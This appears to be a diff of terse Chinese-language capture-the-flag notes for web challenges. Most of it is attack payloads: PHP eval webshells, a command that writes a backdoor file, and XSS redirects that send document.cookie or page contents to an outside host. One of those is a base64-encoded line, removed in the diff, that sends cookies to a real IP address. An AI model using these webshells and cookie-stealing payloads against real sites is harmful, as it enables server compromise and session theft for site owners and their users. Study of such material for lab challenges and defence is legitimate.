@@ -1,3 +1,4 @@
+/flag默认的flag存放位置
 POST请求：GET->POST header要加Content-Type: application/x-www-form-urlencoded 另注意不要有空格回车等……(burp易带）方法是检查length
 webshell注意;|'等啊啊啊	<?=eval($_POST['a']);	a=system("ls");
 $_POST[__]($_POST[_])	webshell：__=system&_=echo "<?php eval($_POST['xxx']);?>">xxx.php
@@ -17,7 +18,11 @@ script引入<script>正确结束方法是<\/script>，渲染两次时使用<\\/s
 
 \是续行符，因为\\r\n会注释掉，所以延续下一行
 windows大小写不敏感，linux敏感，可以测试区别
-内网安全攻防、p神1/0
-java字符串只能用“”.'是char
+内网安全攻防、p神 1/0测试计算器
+java字符串只能用“”.'是char，注意容错情况
 一键可能不回显，解决是msf
-bG9jYXRpb24uaHJlZiA9ICJodHRwOi8vMzUuMTYwLjQ5LjEzNjo1OTI0My8/IiArIGJ0b2EoZG9jdW1lbnQuY29va2llKQ==
+！注意注意！+在url中要改为%2b，否则识别为空格！
+location="http://XXXX"和location.herf="//XXXX"	btoa(document.body.innerHTML) 和btoa(document.cookie）可以查看有用信息
+
+上传后发现状态码500，无法解析我们bash文件。因为我们的目标站点是linux环境，如果我们用(windows等)本地编辑器编写上传时编码不一致导致无法解析，所以我们可以在linux环境中编写并导出再上传。
+phpinfo php.ini
